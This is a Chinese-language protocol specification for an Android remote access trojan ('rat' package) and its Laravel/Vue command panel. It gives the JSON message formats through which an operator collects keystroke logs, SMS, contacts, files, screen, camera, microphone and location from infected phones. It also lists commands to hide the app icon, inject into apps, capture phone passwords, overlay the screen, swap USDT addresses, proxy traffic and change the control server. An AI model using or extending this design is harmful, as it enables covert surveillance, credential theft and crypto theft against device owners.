# WebSocket 协议数据结构文档

> Laravel Swoole WebSocket Server ↔ Android APK 完整通信协议
> 服务端: `app/app/WebSocket/` | 客户端: `android/app/src/main/java/com/vendor/rat/network/`
> 日期: 2026-03-19

---

## 1. 架构总览

```
┌──────────────┐     WebSocket (ws://host:8081)     ┌──────────────────┐
│  Vue 3 Panel │ ◄──────────────────────────────────► │  Laravel Swoole  │
│  (前端面板)   │                                      │  WebSocket Server│
└──────────────┘                                      └────────┬─────────┘
                                                               │
                                                               │ WebSocket
                                                               │
                                                      ┌────────▼─────────┐
                                                      │  Android APK     │
                                                      │  (Replica 设备端) │
                                                      └──────────────────┘
```

## 2. 消息路由 (MessageRouter)

所有 WebSocket 消息必须是 JSON 格式。路由基于 `itype` 和 `subc` 字段。

```
MessageRouter.route(fd, rawData)
  │
  ├─ subc="subscribe" or "checkphone"  → SubscribeHandler (面板订阅/设备列表)
  ├─ subc="ping" && itype=null         → 面板心跳 → 返回 pong
  │
  ├─ itype="Slr_client"               → DeviceHandler (设备端消息)
  ├─ itype="slr_panel"                → PanelHandler (面板操作命令)
  └─ itype="slr_panelsend"            → PanelSendHandler (面板→设备 控制命令)
```

### 客户端类型常量

| 常量 | 值 | 角色 | 说明 |
|------|-----|------|------|
| `device` | `Slr_client` | Android 设备 | 数据上报 + 接收控制命令 |
| `panel` | `slr_panel` | Vue 3 面板 | 实时监控 + 屏幕操作 |
| `panel_send` | `slr_panelsend` | Vue 3 面板 | 发送控制命令到设备 |

---

## 3. 设备端 → 服务端 (APK 上报)

### 3.1 心跳/注册 (ping)

设备首条消息即完成注册，后续每 10s 发送一次。

```json
{
  "itype": "Slr_client",
  "subc": "ping",
  "pid": "790694236383350784",
  "msg": "phone_name=Huawei+P40&model=ELS-AN00&android_version=12&battery_charge=85%25&accessibility=1&country=CN&user_email=test%40example.com&install_date=2026-03-15"
}
```

**msg 字段** (URL-encoded key=value):

| 参数 | 类型 | 说明 | DB 列 |
|------|------|------|-------|
| `phone_name` | string | 设备名称 | `devices.name` |
| `model` | string | 设备型号 | `devices.model` |
| `android_version` | string | Android 版本 | `devices.android_version` |
| `battery_charge` | string | 电池电量 (如 "85%") | `devices.battery_level` |
| `accessibility` | "0"/"1" | 无障碍服务状态 | `devices.has_accessibility` |
| `country` | string | 国家代码 | `devices.country` |
| `user_email` | string | 用户邮箱 (可含 `email\|\|hmac` 格式) | 用于设备归属认证 |
| `install_date` | string | 安装日期 | `devices.installed_at` |
| `ip` | string | IP 地址 (可选，服务端自动获取) | `devices.ip_address` |

**服务端处理**: `DeviceHandler.handlePing()` → `DeviceStatusService.updateFromPing()` → `parse_str($msg)` → Redis + MySQL

### 3.2 文本类数据上报

适用于: sms, chat, files, savefiles, snap, loc, loadapps, loadcontacts, injapps

```json
{
  "itype": "Slr_client",
  "subc": "<type>",
  "pid": "790694236383350784",
  "msg": "<data>"
}
```

| subc | 说明 | msg 内容 |
|------|------|---------|
| `sms` | 短信列表 | JSON 字符串 |
| `chat` | 聊天消息 | JSON 字符串 |
| `files` | 文件列表 | JSON 字符串 |
| `savefiles` | 保存的文件 | JSON 字符串 |
| `snap` | 截图数据 | Base64 图片 |
| `loc` | 位置信息 | JSON (lat/lng) |
| `loadapps` | 应用列表 | JSON 字符串 |
| `loadcontacts` | 联系人列表 | JSON 字符串 |
| `injapps` | 注入应用列表 | JSON 字符串 |

### 3.3 键盘记录上报

```json
// 键盘日志内容
{
  "itype": "Slr_client",
  "subc": "klogs",
  "pid": "790694236383350784",
  "msg": "<keylog_data>"
}

// 键盘日志日期列表
{
  "itype": "Slr_client",
  "subc": "klogsdate",
  "pid": "790694236383350784",
  "msg": "<date_list>"
}
```

**服务端转发**: `klogs` → Panel 收到 `type: "klog"` (注意 type 名不同)

### 3.4 屏幕/截图上报

```json
{
  "itype": "Slr_client",
  "subc": "screen",
  "pid": "790694236383350784",
  "img": "<base64_image_data>",
  "wmob": 1080,
  "hmob": 1920
}
```

| 字段 | 类型 | 说明 |
|------|------|------|
| `subc` | "screen" / "screenshot" | 投屏 (SN→screen) / 截图 (SM→screenshot) |
| `img` | string | Base64 编码图片 |
| `wmob` | number | 屏幕宽度 (px) |
| `hmob` | number | 屏幕高度 (px) |

### 3.5 相机上报

```json
{
  "itype": "Slr_client",
  "subc": "cam",
  "pid": "790694236383350784",
  "img": "<base64_image_data>"
}
```

### 3.6 麦克风上报

```json
{
  "itype": "Slr_client",
  "subc": "mic",
  "pid": "790694236383350784",
  "voip": "<audio_data>"
}
```

### 3.7 缩略图上报

```json
{
  "itype": "Slr_client",
  "subc": "thumb",
  "pid": "790694236383350784",
  "msg": "<thumbnail_data>",
  "pth": "/sdcard/DCIM/photo.jpg"
}
```

### 3.8 文件下载 (分块)

```json
{
  "itype": "Slr_client",
  "subc": "down",
  "pid": "790694236383350784",
  "filename": "photo.jpg",
  "filedata": "<base64_chunk>",
  "totalSize": 1048576,
  "sentSize": 262144,
  "chunkNumber": 1,
  "filehash": "abc123",
  "filepath": "/sdcard/DCIM/photo.jpg"
}
```

### 3.9 文件搜索结果

```json
{
  "itype": "Slr_client",
  "subc": "srch",
  "pid": "790694236383350784",
  "pths": "<path_list>",
  "stype": "<search_type>"
}
```

### 3.10 代理状态上报

```json
// 首次连接
{
  "itype": "Slr_client",
  "subc": "proxy",
  "pid": "790694236383350784",
  "ctype": "first",
  "loip": "192.168.1.100",
  "pport": "8080"
}

// 状态变更
{
  "itype": "Slr_client",
  "subc": "proxy",
  "pid": "790694236383350784",
  "ctype": "state",
  "pxstate": "connected"
}

// 数据上行
{
  "itype": "Slr_client",
  "subc": "proxy",
  "pid": "790694236383350784",
  "ctype": "dataup",
  "oip": "1.2.3.4",
  "purl": "https://example.com",
  "pmth": "GET"
}
```

---

## 4. 服务端 → 设备端 (Panel 控制命令)

Panel 通过 `PanelSendHandler` 发送命令，服务端转换格式后下发到设备。

### 4.1 screencomd 类命令 (PanelSendHandler)

通用格式:
```json
{"type": "screencomd", "subc": "<CommandName>", ...extraFields}
```

#### 投屏/截屏控制

```json
{"type": "screencomd", "subc": "Screen", "comdtype": "SM"}
```

| comdtype | 说明 |
|----------|------|
| `SM` | 开始投屏 (MediaProjection) |
| `SN` | 开始投屏 (Notification) |
| `SK` | 开始投屏 (Keylog) |
| `SMOFF` | 停止投屏 (MediaProjection) |
| `SNOFF` | 停止投屏 (Notification) |
| `SKOFF` | 停止投屏 (Keylog) |

#### 相机控制

```json
// 开启
{"type": "screencomd", "subc": "Camera", "SelectedCam": "front"}
// 关闭
{"type": "screencomd", "subc": "CameraOff"}
```

#### 麦克风控制

```json
// 开启
{"type": "mic", "subc": "ON"}
// 关闭
{"type": "mic", "subc": "OFF"}
```

#### 定位控制

```json
// 开启
{"type": "screencomd", "subc": "Location"}
// 关闭
{"type": "screencomd", "subc": "Locationoff"}
```

#### 短信操作

```json
// 获取短信列表
{"type": "screencomd", "subc": "SMS"}

// 发送短信
{"type": "screencomd", "subc": "SMSSEND", "smsnumber": "13800138000", "message": "Hello"}
```

#### 联系人

```json
{"type": "screencomd", "subc": "Contacts"}
```

#### 文件操作

```json
// 浏览文件
{"type": "screencomd", "subc": "files", "filepath": "/sdcard/"}

// 查看文件
{"type": "screencomd", "subc": "viewfile", "filepath": "/sdcard/test.txt"}

// 文件操作 (上传/删除/下载)
{
  "type": "screencomd",
  "subc": "changefiles",
  "comdtype": "U",
  "filepath": "/sdcard/",
  "filetype": "image",
  "filename": "photo.jpg",
  "size": "1024",
  "content": "<base64_data>",
  "chunkIndex": 0,
  "totalChunks": 4
}
```

| comdtype | 说明 |
|----------|------|
| `U` | 上传 (服务端自动分 256KB 块) |
| `D` | 下载 |
| `R` | 删除 |

#### 键盘记录

```json
// 开启/关闭
{"type": "screencomd", "subc": "Keylog", "comdtype": "0"}

// 查询日期
{"type": "screencomd", "subc": "Logdate", "comdtype": "1", "kdate": "2026-03-19"}
```

| comdtype | 说明 |
|----------|------|
| `0` | 开启键盘记录 |
| `1` | 关闭键盘记录 |

#### 应用管理

```json
// 加载应用列表
{"type": "screencomd", "subc": "LOADAPPS"}

// 打开应用
{"type": "screencomd", "subc": "OPENAPP", "package": "com.example.app"}

// 卸载应用
{"type": "screencomd", "subc": "UNINSTALLAPP", "package": "com.example.app"}
```

#### 隐藏图标

```json
{"type": "screencomd", "subc": "Hideico"}
```

#### 重命名设备

```json
{"type": "screencomd", "subc": "Rename", "name": "新设备名"}
```

#### 更换服务器

```json
{"type": "screencomd", "subc": "change", "domain": "new.server.com", "ip": "1.2.3.4", "changeid": "xxx"}
```

#### 弹窗

```json
{"type": "screencomd", "subc": "DIAO", "pin": "1234", "title": "标题", "lckdis": "内容", "typ": "1"}
```

#### 注入管理

```json
// 打开注入
{"type": "screencomd", "subc": "OPENINJ"}

// 关闭注入
{"type": "screencomd", "subc": "noinj", "jctid": "inject_id"}

// 获取注入记录
{"type": "screencomd", "subc": "getinject"}
```

#### 显示控制

```json
{"type": "screencomd", "subc": "display", "display": "on"}
```

#### 文件搜索

```json
{"type": "screencomd", "subc": "srch", "srchfor": "*.jpg", "srchin": "/sdcard/", "targetpath": "/sdcard/DCIM"}
```

#### 文件复制

```json
{"type": "screencomd", "subc": "cocu", "state": "copy", "tp": "/sdcard/dest/", "fp": "/sdcard/src/file.txt"}
```

#### 聊天消息

```json
{"type": "screencomd", "subc": "chat", "msg": "消息内容", "title": "标题"}
```

#### 文件获取

```json
{"type": "screencomd", "subc": "fetch", "ftype": "photo", "fpath": "/sdcard/DCIM/"}
```

### 4.2 活动记录命令

```json
{"type": "Activitys", "subc": "<code>", "kdate": "2026-03-19"}
```

| subc | 说明 |
|------|------|
| `GA` | 获取活动记录 |
| `DA` | 删除活动记录 |
| `GF` | 获取通知记录 |
| `DF` | 删除通知记录 |
| `GV` | 获取访问应用 |
| `DV` | 删除访问应用 |
| `GU` | 获取访问链接 |
| `DU` | 删除访问链接 |

### 4.3 权限命令

```json
{"type": "Permissions", "subc": "R", "prim": "android.permission.CAMERA"}
```

### 4.4 删除设备

```json
{"type": "Delete", "subc": "[reme]"}
```

### 4.5 通知命令

```json
{"type": "Notifi", "noti": "通知内容"}
```

### 4.6 screen 类命令 (PanelHandler)

实时投屏操作，通过 `PanelHandler.handleScreenCommand()` 处理:

```json
{"type": "screen", "subc": "<command>", ...fields}
```

| subc | 额外字段 | 说明 |
|------|---------|------|
| `block` | `blockstate`, `color` | 锁屏遮罩 |
| `paste` | `txt` | 粘贴文本 |
| `mov` | `poi`, `movetype` | 触摸/滑动操作 |
| `snap` | `snaptype` | 截图 (1=普通) |
| `vol` | `volstate` | 音量控制 (0/1) |
| `kb` | `kbstate` | 键盘控制 (0/1) |
| `L` | `lock` | 锁屏 (0/1) |
| `nav` | `nav` | 导航键 (back/home/recent) |
| `Q` | `newq` | 画质调整 |
| `phonepass` | `passtype`, `phonepass` | 密码操作 |
| `usdt` | `usdttype` | USDT 操作 |
| `usdtadress` | `usdtadresstext` | USDT 地址 |
| `blockd` | `blocktext` | 遮罩文本 |
| `out` | — | 退出投屏 |

### 4.7 浏览器命令

```json
// 隐藏浏览器
{"type": "brows", "subc": "h", "bcom": "1", "extdata": {...}}

// 普通浏览器
{"type": "brows", "subc": "n", "ltype": "u", "extdata": "https://example.com"}
```

| bcom | 说明 |
|------|------|
| `0` | 停止 |
| `1` | 启动 |
| `3` | 执行命令 |

### 4.8 代理控制

```json
{"type": "proxy", "subc": "1"}
```

| subc | 说明 |
|------|------|
| `1` | 开启代理 |
| `0` | 关闭代理 |

### 4.9 广播命令

```json
// Alert 弹窗
{"type": "bc", "subc": "A", "thetitle": "标题", "themsg": "内容", "toopen": "com.app", "theype": "1", "ico": "icon_url"}

// Notification 通知
{"type": "bc", "subc": "N", "thetitle": "标题", "themsg": "内容", "toopen": "com.app", "theype": "0"}
```

| theype | 说明 |
|--------|------|
| `0` | 无操作 |
| `1` | 打开应用 |
| `2` | 打开链接 |

---

## 5. 服务端 → 面板 (状态推送)

### 5.1 设备状态批量更新

设备每次 ping 时，服务端向订阅该设备的面板推送:

```json
{
  "type": "statusBatch",
  "pid": "790694236383350784",
  "serverToPhone": "OPEN",
  "lastPing": "3 秒前",
  "phoneInfo": {
    "pid": "790694236383350784",
    "phone_name": "Huawei P40",
    "model": "ELS-AN00",
    "android_version": "12",
    "battery_charge": "85%",
    "accessibility": "1",
    "country": "CN",
    "ip": "1.2.3.4",
    "ip_location": "北京市",
    "is_online": true,
    "lastPing": 1710835200000,
    "user_email": "test@example.com"
  }
}
```

| serverToPhone | 说明 |
|---------------|------|
| `OPEN` | 设备在线 |
| `CLOSED` | 设备离线 |

### 5.2 设备列表 (subscribe)

面板订阅时返回:

```json
{
  "type": "subscribe",
  "success": true,
  "isAdmin": false,
  "devices": [...],
  "stats": {"total": 10, "online": 3, "offline": 7}
}
```

### 5.3 设备列表分页 (checkphone)

```json
{
  "type": "checkphone",
  "list": [
    {
      "phone_id": "790694236383350784",
      "phone_name": "Huawei P40",
      "model": "ELS-AN00",
      "android_version": "12",
      "battery_charge": "85",
      "accessibility": "1",
      "country": "CN",
      "user_email": "test@example.com",
      "install_date": "2026-03-15 10:00:00",
      "is_online": true,
      "lastPing": 1710835200000
    }
  ],
  "total": 50,
  "pageCount": 5,
  "page": 1,
  "pageSize": 10,
  "fileLastModified": "2026-03-19 12:00:00"
}
```

### 5.4 心跳响应

```json
{"type": "pong", "timestamp": 1710835200}
```

### 5.5 错误响应

```json
{"type": "error", "error": "Not authenticated. Please provide a valid token."}
```

---

## 6. 面板 → 服务端 (Panel 请求)

### 6.1 订阅

```json
{"subc": "subscribe", "token": "Bearer xxx"}
```

### 6.2 设备列表查询

```json
{
  "subc": "checkphone",
  "token": "Bearer xxx",
  "page": 1,
  "pageSize": 10,
  "filters": {
    "user_email": "test",
    "phone_name": "Huawei",
    "country": "CN",
    "model": "P40",
    "accessibility": "1",
    "install_date": "2026-03-15"
  }
}
```

### 6.3 加入设备监控

```json
{"itype": "slr_panel", "subc": "join", "pid": "790694236383350784", "token": "Bearer xxx"}
```

### 6.4 面板心跳

```json
{"subc": "ping"}
```

### 6.5 断开设备

```json
{"itype": "slr_panel", "subc": "disag", "pid": "790694236383350784"}
```

### 6.6 发送控制命令

```json
{"itype": "slr_panelsend", "subc": "screen", "pid": "790694236383350784", "screentype": "SM", "token": "Bearer xxx"}
```

---

## 7. Android WebSocketClient 常量映射

```java
// WebSocketClient.java
public static final String ITYPE_DEVICE = "Slr_client";
public static final String SUBC_PING    = "ping";
public static final String SUBC_CAM     = "cam";
public static final String SUBC_MIC     = "mic";
public static final String SUBC_THUMB   = "thumb";
public static final String SUBC_DOWN    = "down";
public static final String SUBC_SRCH    = "srch";
public static final String SUBC_PROXY   = "proxy";
```

### 发送方法映射

| 方法 | subc | 特殊字段 | 对应 DeviceHandler 处理 |
|------|------|---------|----------------------|
| `sendPing(status)` | `ping` | `msg` (URL-encoded) | `handlePing()` |
| `sendData(subc, data)` | 动态 | `msg` | `forwardToPanel()` |
| `sendScreen(subc, img, w, h)` | `screen`/`screenshot` | `img`, `wmob`, `hmob` | 特殊处理 |
| `sendCamera(img)` | `cam` | `img` | 特殊处理 |
| `sendMic(audio)` | `mic` | `voip` | 特殊处理 |
| `sendThumb(data, path)` | `thumb` | `msg`, `pth` | 特殊处理 |
| `sendFileChunk(...)` | `down` | 7 个字段 | 特殊处理 |
| `sendSearchResult(paths, type)` | `srch` | `pths`, `stype` | 特殊处理 |
| `sendProxy(ctype, extra)` | `proxy` | `ctype` + 动态字段 | `buildProxyPanelData()` |

---

## 8. 认证机制

### 8.1 设备认证

设备通过 ping 消息中的 `user_email` 字段认证:
- 格式: `email||hmac` 或纯 `email`
- `DeviceTokenService.validateToken()` 验证 HMAC
- 验证通过后设备绑定到对应用户

### 8.2 面板认证

面板通过 `token` 字段认证:
- 格式: `Bearer <jwt_token>`
- `PanelAuthService.authenticate()` 验证 JWT
- 支持 inline token (每条消息带 token) 或 session (首次认证后 fd 记住)

### 8.3 设备访问授权

- Admin 用户可访问所有设备
- 普通用户只能访问自己的设备 (`device.user_id = user.id`)
- `ConnectionManager.isPanelAuthorizedForDevice()` 检查

---

## 9. 数据流向汇总

```
设备上报:  APK → sendPing/sendData/sendScreen/... → Laravel DeviceHandler → forwardToPanel → Vue 3
控制命令:  Vue 3 → PanelSendHandler/PanelHandler → sendToDevice → APK CommandDispatcher → 执行
状态同步:  APK ping → DeviceHandler → Redis + MySQL + Panel statusBatch 推送
```
